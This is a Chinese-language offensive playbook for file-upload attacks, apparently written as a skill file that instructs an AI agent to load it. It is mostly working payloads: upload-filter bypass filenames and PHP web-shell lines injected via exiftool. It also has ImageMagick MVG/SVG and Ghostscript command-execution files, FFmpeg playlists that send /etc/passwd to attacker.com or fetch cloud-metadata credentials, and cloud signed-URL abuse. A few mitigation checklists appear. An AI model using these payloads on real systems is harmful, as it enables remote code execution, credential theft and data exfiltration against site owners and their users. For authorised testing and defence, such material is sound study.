# 技能：上传不安全文件 — 验证绕过、存储滥用和处理链

> **AI 加载指令**：专家级文件上传攻击剧本。当目标接受文件、导入、头像、媒体、文档或存档，并且你需要完整的工作流程时使用：验证绕过、存储路径滥用、上传后访问、解析器利用、多租户覆盖，以及链式攻击到 XSS、XXE、CMDi、遍历或业务逻辑影响。针对 Web 服务器解析漏洞、PUT 方法利用以及特定 CVE（WebLogic、Flink、Tomcat），加载配套的 [SCENARIOS.md](./SCENARIOS.md)。

## 0. 相关路由

### 扩展场景

当您需要以下功能时，也加载 [SCENARIOS.md](./SCENARIOS.md)：
- IIS 解析漏洞 — `x.asp/` 目录解析、`;` 分号截断 (`shell.asp;.jpg`)
- Nginx 解析配置错误 — `avatar.jpg/.php` 配合 `cgi.fix_pathinfo=1`
- Apache 解析 — 多重扩展名、`AddHandler`、CVE-2017-15715 `\n` (0x0A) 绕过
- PUT 方法利用 — IIS WebDAV PUT+COPY、Tomcat CVE-2017-12615 `readonly` + `.jsp/` 绕过
- WebLogic CVE-2018-2894 通过 Web 服务测试页面进行任意文件上传
- Apache Flink CVE-2020-17518 带路径遍历的文件上传
- 上传 + 解析漏洞链 — EXIF PHP 代码 + Nginx `/.php` 路径信息
- 完整扩展名绕过参考表（PHP/ASP/JSP 替代方案、大小写变化、空字节）

将此文件用作深度上传工作流参考。也加载：
- [路径遍历 LFI](../path-traversal-lfi/SKILL.md) 当文件名、提取路径或包含路径成为文件系统控制时
- [XSS 跨站脚本](../xss-cross-site-scripting/SKILL.md) 当上传内容在浏览器上下文中渲染时
- [XXE XML 外部实体](../xxe-xml-external-entity/SKILL.md) 当接受 SVG、OOXML 或 XML 导入时
- [CMDi 命令注入](../cmdi-command-injection/SKILL.md) 当处理器、转换器或媒体管道执行系统工具时
- [业务逻辑漏洞](../business-logic-vulnerabilities/SKILL.md) 当配额、覆盖规则、审批或存储路径创建逻辑错误时
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) 当服务器是 **Apache Tomcat** 且 WAF 块住 `.jsp` 在 `filename*` 中时 — Tomcat 的 `RFC2231Utility` 将每个字符缩小到字节，因此 `1.陪sp` (U+966A 低字节 = `j`) 将 `1.jsp` 写入磁盘，而 WAF 看不到 `.jsp` 字面量

---

## 1. 核心 模型

每个上传功能都应作为四个独立的信任边界进行测试：

1. **接受**：文件存储之前会发生什么验证？
2. **存储**：文件写入何处，以及使用什么名称和权限？
3. **处理**：哪些后台工具、转换器、扫描器、解析器或提取器会接触它？
4. **服务**：它之后如何下载、渲染、转换或共享？

许多目标只验证一个阶段。漏洞通常出现在与文件上传阶段不同的阶段。

---

## 2. 侦察 问题 优先

在选择载荷之前，回答以下问题：

- 允许、拒绝或标准化哪些扩展名？
- 后端信任扩展名、MIME 类型、魔术字节还是全部？
- 文件是否被重命名、转换、解压缩、扫描或重新托管？
- 获取是直接的、代理的、签名的还是从 CDN 提供的？
- 一个用户能否预测或覆盖另一个用户的文件路径？
- 文件名、元数据或预览是否反映回 HTML、日志、管理控制台或 PDF？

---

## 3. 验证 绕过 矩阵

| 验证风格 | 测试内容 |
|---|---|
| 扩展名黑名单 | 双扩展名、大小写切换、尾随点、替代分隔符 |
| 仅内容类型 | 不匹配的多部分 `Content-Type`、浏览器与代理重写 |
| 仅魔术字节 | 多格式文件或有效头部加上危险尾部内容 |
| 服务器端重命名 | 危险内容是否在重命名后仍然保留并用于后续渲染 |
| 图像仅策略 | SVG、损坏的图像加上元数据、解析器差异 |
| 存档或导入仅 | zip 内容、嵌套路径名、XML 成员、解压缩行为 |

代表性绕过家族：

```text
shell.php.jpg
avatar.jpg.php
file.asp;.jpg
file.php%00.jpg
file.svg
archive.zip
```

这个小的样本集已经涵盖了前一个独立上传载荷助手的所有主要用例，因此不需要为第一轮选择添加额外条目。

不要止步于上传成功。没有危险的检索或处理的上传成功是不够的。

---

## 4. 存储 和 获取 滥用

### 可预测或可控的路径

寻找类似模式的：

```text
/uploads/USER_ID/avatar.png
/files/org-slug/report.pdf
/cdn/tmp/<uuid>/<filename>
```

测试：

- 通过猜测 ID、slugs 或 UUID 模式进行跨租户读取
- 通过重用另一个用户的文件名进行覆盖
- 文件名或存档成员中的路径规范化错误
- 尽管有 UI 级别的访问控制，但通过直接对象 URL 暴露的私有文件

### 基于文件名的注入表面

即使一个安全的文件也可能是危险的，如果文件名被反射到：

- 画廊 HTML
- 管理员审核面板
- PDF/CSV 导出作业
- 日志、审计视图或电子邮件通知

如果文件名被反射，将其视为存储输入，而不是被动元数据。

---

## 5. 处理链 攻击

最高价值的上传漏洞通常存在于异步处理器中。

### 常见处理器类别

| 处理器 | 风险 |
|---|---|
| 图像调整或缩略图生成 | 解析器差异、ImageMagick 或库漏洞、元数据反射 |
| 视频或音频转换 | FFmpeg 风格的解析和协议滥用 |
| 存档提取 | zip 滑动、覆盖、解压缩炸弹 |
| 文档导入 | CSV 公式注入、办公 XML 解析、宏相邻工作流 |
| XML 或 SVG 解析 | XXE、SSRF、本地文件泄露 |
| HTML 到 PDF 或预览渲染 | SSRF、脚本执行、本地文件引用 |
| AV 或 DLP 扫描 | 解压缩深度、隐藏嵌套内容、竞态条件 |

### 需要证明的内容

1. 文件被处理器接触。
2. 处理器与上传验证器的行为不同。
3. 这种差异造成影响：读取、执行、覆盖、SSRF 或存储客户端执行。

---

## 6. 高价值 利用 路径

### 浏览器执行

- 作为活动内容提供的 SVG
- HTML 或文本上传内联渲染
- EXIF 或文件名反射到 HTML 页面

### XML 和文档解析

- SVG XXE 用于文件读取或 SSRF
- OOXML 导入用于 XML 实体或解析器滥用
- CSV 导入用于分析员工作流中的公式执行

### 服务器端执行或文件系统影响

- 图像或文档转换器调用 shell 工具
- zip 滑动写入预期目录之外
- 上传到 LFI 链，上传内容后来成为可包含的

### 访问控制 和 共享 漏洞

- 私有上传可通过可预测的 URL 访问
- 审核或隔离路径仍然公开可达
- 一个用户替换另一个用户的公共资源

---

## 7. 授权 和 业务 逻辑 检查

上传功能经常隐藏非解析器漏洞：

- UI 强制的上传配额但在 API 中未强制
- 在上传页面检查计划限制但在导入端点未检查
- 在列表视图中检查文件所有权但在直接下载或替换端点未检查
- 通过直接调用最终存储端点绕过审批工作流
- 删除或替换操作缺少对象级授权

当上传路径包含账户、项目或组织标识符时，始终运行 A/B 授权测试。

---

## 8. 测试 顺序

1. 上传一个良性标记文件并映射重命名、路径和检索行为。
2. 尝试一个验证绕过样本和一个主动内容样本。
3. 检查检索是附件、内联渲染、转换预览还是后台处理。
4. 如果存在处理，通过处理器家族进行转换：XSS、XXE、CMDi、zip 滑动或 SSRF。
5. 在文件 ID、替换端点和公共 URL 上运行租户边界和覆盖测试。

---

## 9. 链式 映射

| 观察 | 转换 |
|---|---|
| 接受 SVG 或 XML | [xxe xml 外部实体](../xxe-xml-external-entity/SKILL.md) |
| 文件名或元数据反射 | [xss 跨站脚本](../xss-cross-site-scripting/SKILL.md) |
| 转换器或处理器调用 shell | [cmdi 命令注入](../cmdi-command-injection/SKILL.md) |
| 提取路径看起来可控 | [路径遍历 LFI](../path-traversal-lfi/SKILL.md) |
| 覆盖、配额、审批或租户漏洞 | [业务逻辑漏洞](../business-logic-vulnerabilities/SKILL.md) |

---

## 10. 操作员 检查清单

```text
[] 确认接受/存储/处理/服务阶段分别测试
[] 测试一个扩展名绕过和一个基于内容的载荷
[] 检查内联渲染与强制下载
[] 检查文件名、元数据和预览表面是否存在反射
[] 探测处理链：图像、存档、XML、文档、PDF
[] 在读取、替换、删除和共享操作上运行 A/B 授权
[] 映射可预测路径和公共/私有 URL 边界
```

---

## 11. 上传 成功率 模型 & 高级 方法论

### 成功率公式

```
P(RCE via Upload) = P(bypass_detection) × P(obtain_path) × P(execute_via_webserver)
```

许多测试人员只关注绕过文件类型检查，但忘记了：

- **路径发现**：不知道上传路径，即使成功绕过也是无用的
- **服务器解析**：即使上传了 `.php` 文件，如果 Web 服务器不将其解析为 PHP，则没有 RCE

### 富文本编辑器 路径 矩阵

| 编辑器 | 常见上传路径 | 版本指示器 |
|---|---|---|
| FCKeditor | `/fckeditor/editor/filemanager/connectors/` | `/fckeditor/_whatsnew.html` |
| CKEditor | `/ckeditor/` | `/ckeditor/CHANGES.md` |
| eWebEditor | `/ewebeditor/` | 管理：`/ewebeditor/admin_login.asp` |
| KindEditor | `/kindeditor/attached/` | `/kindeditor/kindeditor.js` |
| UEditor | `/ueditor/net/` 或 `/ueditor/php/` | `/ueditor/ueditor.config.js` |

### 验证 缺陷 分类法（5 个维度）

| 维度 | 缺陷示例 |
|---|---|
| **位置** | 仅客户端、前后端不一致 |
| **方法** | 扩展名黑名单（不完整）、仅 MIME 检查、仅魔术字节 |
| **逻辑顺序** | 重命名在执行检查之后、在完整上传之前验证 |
| **范围** | 检查文件名但不检查文件内容、仅检查前几个字节 |
| **执行 上下文** | 上传成功但不同的 vhost/handler 处理文件 |

### 响应 操作 滥用

```
# 如果服务器在客户端验证返回 allowedTypes：
# 截获响应 → 修改 allowedTypes 以包含 .php → 上传 .php
# 服务器实际上从未验证 — 它信任客户端过滤
```

### IIS 分号解析

```
# IIS 在文件名中视分号为参数分隔符：
shell.asp;.jpg    → IIS 执行为 ASP
# NTFS 替代数据流：
shell.asp::$DATA  → 绕过扩展名检查，IIS 可能执行
```

### Apache 多扩展名

```
# Apache 从右到左解析处理程序：
shell.php.jpg     → 如果 AddHandler php 适用，可能执行为 PHP
# 文件名中的换行符（CVE-2017-15715）：
shell.php\x0a     → 绕过正则表达式，但 Apache 仍然执行为 PHP
```

### Nginx cgi.fix_pathinfo

```
# With cgi.fix_pathinfo=1 (PHP-FPM):
/uploads/image.jpg/anything.php → PHP 处理 image.jpg 作为 PHP!
# 上传看起来合法的 JPG，其中嵌入 PHP 代码
```

---

## 12. 多格式 文件 技术

同时在一个或多个格式中有效的文件，绕过特定格式验证并传递危险载荷。

### GIFAR (GIF + JAR)

```text
# GIF 头部 + JAR 追加
# GIF89a 头部（6 字节）+ 填充 + JAR 存档（ZIP 格式）
# 浏览器：有效的 GIF 图像
# Java：有效的 JAR 存档 → applet 执行（遗留）

cat header.gif payload.jar > gifar.gif
# 通过图像验证，如果通过 <applet> 加载，则执行为 Java applet
```

### PNG + PHP 多格式

```bash
# 将 PHP 代码注入 PNG IDAT 块或 tEXt 元数据
# PNG 渲染为有效图像；当通过 LFI 包含时，PHP 代码执行

# 方法 1：tEXt 块中的 PHP
python3 -c "
import struct
png_header = b'\x89PNG\r\n\x1a\n'
# ... 最小 IHDR + IDAT + tEXt 块包含 PHP
"

# 方法 2：使用 exiftool 注入到注释
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
# 上传 image.png → LFI 包含 → 从元数据执行 PHP
```

### JPEG + JS 多格式

```bash
# JPEG 注释标记 (0xFFFE) 可以包含 JavaScript
# 如果使用 Content-Type: text/html（或 MIME 检测激活）：
exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg

# 结合内容类型混淆 → 通过图像上传进行 XSS
```

### PDF + JS 多格式

```text
# PDF 头部后跟 JS：
%PDF-1.0
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</MediaBox[0 0 3 3]>>endobj
trailer<</Root 1 0 R>>
*/=alert('XSS')/*
```

---

## 13. IMAGEMAGICK 利用 链

### CVE-2016-3714 (ImageTragick) — 通过 Delegates 进行 RCE

ImageMagick 使用 "delegates"（外部程序）进行某些格式转换。特别构造的文件触发 shell 命令执行：

### MVG (Magick Vector Graphics)

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

### SVG delegates 滥用

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
  <image xlink:href="https://example.com/image.jpg&quot;|id > /tmp/pwned&quot;" x="0" y="0"/>
</svg>
```

### Ghostscript 利用

ImageMagick 将 Ghostscript 用于 PDF/PS/EPS 处理。Ghostscript 已有多个沙盒逃逸：

```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/pwned) currentdevice putdeviceprops
```

上传为 `.eps`、`.ps` 或 `.pdf` → ImageMagick 调用 Ghostscript → RCE。

### 缓解 检查

```text
□ ImageMagick policy.xml 是否限制危险 coders？
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
□ Ghostscript 是否更新并沙盒化 (-dSAFER)?
```

---

## 14. FFMPEG SSRF & 本地 文件 读取

### HLS 节目单文件读取

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST
```

上传为 `.m3u8` 或 `.ts` → FFmpeg 处理它 → 文件内容与头部连接发送到攻击者服务器或嵌入输出视频。

### 通过 HLS 进行 SSRF

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

FFmpeg 服务器端获取 URL → SSRF 到云元数据端点。

### Concat 协议用于本地文件包含

```m3u8
#EXTM3U
#EXTINF:1,
concat:file:///etc/passwd|subfile,,start,0,end,0,,:
#EXT-X-ENDLIST
```

### AVI + 字幕 SSRF

创建 AVI 带引用 URL 的字幕轨道：

```bash
ffmpeg -i input.avi -vf "subtitles=http://169.254.169.254/latest/meta-data/" output.avi
```

---

## 15. 云 存储 上传 考虑

### S3 预签名 URL 滥用

```text
# 预签名 URL 生成的特定 key 和 content-type：
PUT https://bucket.s3.amazonaws.com/uploads/avatar.jpg
  ?X-Amz-Algorithm=AWS4-HMAC-SHA256&...&X-Amz-SignedHeaders=host;content-type

# 滥用：如果 content-type 不在 SignedHeaders 中：
# 将 Content-Type 从 image/jpeg 改为 text/html → 上传 XSS 载荷
# 签名仍然有效，因为 content-type 未签名

# 如果路径未签名（仅前缀）：
# 将 key 从 uploads/avatar.jpg 改为 uploads/../admin/config.json
```

**审计 清单**：
```text
□ 哪些头部包含在 SignedHeaders 中？(必须包含 content-type)
□ 是签名完整 key 路径还是仅前缀？
□ 上传桶与提供桶是否相同？(写入 CDN 提供的桶 → 存储 XSS)
□ ACL 是否签名？(防止在敏感上传上设置 public-read)
```

### Azure Blob 存储 SAS Token

```text
# SAS token 范围问题：
# 容器级 SAS 具有写入权限 → 写入容器中的任何 blob
# 服务级 SAS → 可能允许列出/读取其他 blobs
# 检查：sr= (已签名资源), sp= (已签名权限), se= (过期)
```

### GCS Signed URL

```text
# 类似于 S3 — 检查 Content-Type 是否包含在签名中
# 可恢复上传 URL 可能具有比预期更广泛的权限
# V4 签名 URL：验证 X-Goog-SignedHeaders 包括 content-type
```

---

## 16. 内容类型 验证 绕过

### 双扩展名

```text
shell.php.jpg          → Apache with AddHandler may execute as PHP
shell.asp;.jpg         → IIS 分号截断
shell.php%00.jpg       → 空字节截断 (PHP < 5.3.4, 旧 Java)
shell.php.xxxxx        → 未知扩展名 → Apache 落回先前处理程序
```

### MIME 检测 滥用

当服务器不发送 `Content-Type` 或 `X-Content-Type-Options: nosniff` 缺失时：

```text
# 上传具有 HTML/JS 内容但图像扩展名的文件
# 浏览器 MIME 检测内容 → 执行为 HTML
# 即使扩展名验证通过，也适用于存储 XSS
```

### 内容类型 头部与扩展名 不匹配

```text
# 上传请求：
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

# 文件内容：<?php system($_GET['cmd']); ?>

# 服务器信任 Content-Type 头部 (image/jpeg) → 通过验证
# 但存储时基于其他逻辑使用 .php 扩展名 → 执行为 PHP
```

### 大小写 变化

```text
shell.PhP    shell.pHP    shell.Php
shell.aSp    shell.jSp    shell.ASPX
```

### 尾随字符

```text
shell.php.      → 尾随点 (Windows 删除它)
shell.php::$DATA → NTFS 替代数据流 (IIS)
shell.php\x20   → 尾随空格
shell.php%20    → URL 编码的空格
```
